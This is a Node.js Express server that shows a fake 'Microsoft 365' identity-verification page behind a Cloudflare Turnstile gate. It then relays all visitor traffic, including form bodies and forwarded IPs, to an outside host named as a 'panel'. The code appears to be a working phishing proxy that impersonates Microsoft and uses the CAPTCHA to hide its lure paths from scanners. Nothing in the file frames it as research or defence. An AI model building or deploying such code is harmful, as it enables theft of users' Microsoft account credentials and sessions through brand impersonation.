const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();
const port = process.env.PORT || 3000;

const PANEL = 'portal42-343.sbs';
const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm';

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());

// ----- CAPTCHA PAGE -----
app.get('/captcha', (req, res) => {
    let returnPath = req.query.return || '/';
    if (returnPath.startsWith('//')) returnPath = returnPath.replace(/^\/+/, '/');
    if (!returnPath.startsWith('/')) returnPath = '/' + returnPath;
    res.send(getCaptchaHTML(SITE_KEY, returnPath));
});

// ----- PROTECTED ROUTES – redirect to CAPTCHA -----
app.get('/l/*', (req, res) => {
    res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
});
app.get('/device/*', (req, res) => {
    res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
});

// ----- CAPTCHA VERIFICATION (after solving) -----
app.post('/verify-captcha', async (req, res) => {
    const token = req.body['cf-turnstile-response'];
    if (!token) return res.status(400).send('Missing token');
    try {
        const verify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `secret=0x4AAAAAAD1A5eW6o0hhUZQm&response=${token}`
        });
        const data = await verify.json();
        if (data.success) {
            res.cookie('captcha_passed', 'true', { maxAge: 300000, httpOnly: true });
            res.redirect(req.query.return || '/');
        } else {
            res.status(400).send('CAPTCHA failed');
        }
    } catch (e) {
        res.status(500).send('Verification error');
    }
});

// ----- PROXY (only for requests that pass CAPTCHA) -----
app.use('*', async (req, res) => {
    // Check CAPTCHA cookie for protected paths
    const isProtected = req.path.startsWith('/l/') || req.path.startsWith('/device/');
    if (isProtected && !req.cookies.captcha_passed) {
        return res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
    }
    
    try {
        const target = new URL(req.originalUrl, `https://${PANEL}`);
        const headers = new Headers(req.headers);
        headers.set('Host', PANEL);
        headers.set('User-Agent', 'Mozilla/5.0');
        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        if (clientIp) {
            headers.set('X-Forwarded-For', clientIp);
            headers.set('CF-Connecting-IP', clientIp);
        }
        const opts = {
            method: req.method,
            headers: headers,
        };
        if (req.method !== 'GET' && req.method !== 'HEAD') {
            opts.body = JSON.stringify(req.body);
        }
        const response = await fetch(target.toString(), opts);
        const body = await response.text();
        res.status(response.status).set('Content-Type', response.headers.get('content-type') || 'text/html').send(body);
    } catch (e) {
        console.error('Proxy error:', e);
        res.status(500).send('Proxy Error');
    }
});

app.listen(port, () => console.log('✅ Proxy running on port ' + port));

// ----- CAPTCHA HTML -----
function getCaptchaHTML(siteKey, returnPath) {
    return `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Verify</title>
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad" async defer></script>
  <style>
    body { font-family: 'Segoe UI', sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
    .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 100%; }
    .logo { display: flex; justify-content: center; align-items: center; margin-bottom: 30px; }
    .logo svg { width: 36px; height: 36px; margin-right: 12px; }
    .logo span { font-size: 22px; font-weight: 600; color: #1a1a1a; }
    .sub { font-size: 16px; color: #5e5e5e; margin-bottom: 25px; }
    #cf-turnstile { display: flex; justify-content: center; margin: 20px 0; }
    .footer { font-size: 12px; color: #6c6c6c; margin-top: 30px; border-top: 1px solid #e1e1e1; padding-top: 20px; }
    .error { color: #d32f2f; padding: 10px; background: #ffebee; border-radius: 4px; display: none; margin-bottom: 15px; }
    #dp { margin-top: 20px; color: #5e5e5e; font-size: 15px; }
  </style>
</head>
<body>
  <div class="box">
    <div class="logo">
      <svg viewBox="0 0 23 23"><rect x="0" y="0" width="10" height="10" fill="#F25022"/><rect x="12" y="0" width="10" height="10" fill="#7FBA00"/><rect x="0" y="12" width="10" height="10" fill="#00A4EF"/><rect x="12" y="12" width="10" height="10" fill="#FFB900"/></svg>
      <span>Microsoft 365</span>
    </div>
    <div class="sub">Verify your identity to access this document.</div>
    <div id="dp"></div>
    <div id="cf-turnstile"></div>
    <div id="status" class="error"></div>
    <div class="footer">Secure Connection &bull; Microsoft &bull; Terms &bull; Privacy</div>
  </div>
  <script>
    const returnPath = "${returnPath}";
    const msgs = ["Loading...", "Processing...", "Almost there...", "Finalizing..."];
    let idx = 0;
    document.getElementById('dp').textContent = msgs[0];
    setInterval(() => { document.getElementById('dp').textContent = msgs[idx]; idx = (idx+1)%msgs.length; }, 3000);
    function turnstileCallback(token) {
      if (token) {
        fetch('/verify-captcha?return=' + encodeURIComponent(returnPath), {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: 'cf-turnstile-response=' + token
        }).then(r => {
          if (r.redirected) window.location.href = r.url;
          else window.location.href = returnPath;
        });
      }
    }
    function turnstileErrorCallback() {
      document.getElementById('status').textContent = 'Error. Please refresh.';
      document.getElementById('status').style.display = 'block';
    }
    function turnstileExpiredCallback() { if (window.turnstile) turnstile.reset(); }
    function onTurnstileLoad() {
      turnstile.render('#cf-turnstile', {
        sitekey: '${siteKey}',
        theme: 'light',
        callback: turnstileCallback,
        'error-callback': turnstileErrorCallback,
        'expired-callback': turnstileExpiredCallback,
      });
    }
  </script>
</body>
</html>
    `;
}
